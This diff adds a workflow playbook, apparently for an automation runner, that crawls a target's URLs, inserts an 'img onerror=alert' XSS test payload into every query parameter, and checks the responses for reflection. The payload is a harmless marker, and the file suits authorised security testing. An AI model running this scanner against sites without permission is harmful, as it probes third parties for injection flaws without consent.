@@ -1,0 +1,57 @@
+description: atomic xss playbook
+tags: xss, XSS
+params: target=CHANGEME intOrExt=0
+# For $intOrExt parameter, use value 1 external targets. You can use value zero for both internal and external targets.
+env:
+  - HOME: /root/
+  - LOG_DIR: ${HOME}/logs
+  - PATH: /usr/local/bin:${PATH}
+steps:
+  - name: prepare
+    command: rm -f crwl.txt qs.txt
+
+  - name: crawl
+    command: bash
+    script: |
+      ~/go/bin/httpx -u ${target//\"} | katana -o crwl.txt qurl
+    preconditions:
+      - condition: "$intOrExt"
+        expected: "0"
+    continueOn:
+      skipped: true
+    depends:
+      - prepare
+      
+  - name: gau
+    command: bash
+    script: |
+      gau ${target//\"} | grep -Ev "\.(jpeg|jpg|png|ico)$" | grep = 
+    stdout: crwl.txt
+    preconditions:
+      - condition: "$intOrExt"
+        expected: "1"
+    continueOn:
+      skipped: true
+    depends:
+      - prepare
+
+  - name: qsreplace
+    command: bash
+    script: |
+      cat crwl.txt | qsreplace "\"><img src=x onerror=alert(12345654321)>" 
+    stdout: qs.txt
+    depends:
+      - crawl
+      - gau
+
+  - name: httpx and result
+    command: bash
+    script: |
+      cat qs.txt | ~/go/bin/httpx -silent -mc 200 -mr "<img\s+src=x\s+onerror=alert\(12345654321\)>"
+    depends:
+      - qsreplace
+
+  - name: cleanup
+    command: rm crwl.txt qs.txt
+    depends:
+      - httpx and result
